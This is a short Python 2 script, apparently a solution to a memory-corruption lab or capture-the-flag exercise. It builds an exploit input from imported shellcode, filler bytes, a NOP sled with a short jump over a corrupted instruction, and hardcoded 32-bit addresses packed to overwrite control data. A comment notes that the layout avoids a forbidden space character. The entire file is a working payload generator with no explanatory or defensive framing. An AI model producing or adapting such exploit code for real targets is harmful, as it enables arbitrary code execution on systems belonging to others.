from shellcode import shellcode
from struct import pack

# fillers "aaaa", for changing shellcode addrees from 0x80f3720 to 0x80f3724,
# avoiding forbidden character (blank space)

# jmp, offset 5, for skipping corrupted instruction

print "aaaa" + "\x90\x90\xeb\x05" + "\x90" * 5 + shellcode
print "\x90" * 40 + pack("<I", 0x80f3724) + pack("<I", 0xbffe9cbc)
print "CCCC"
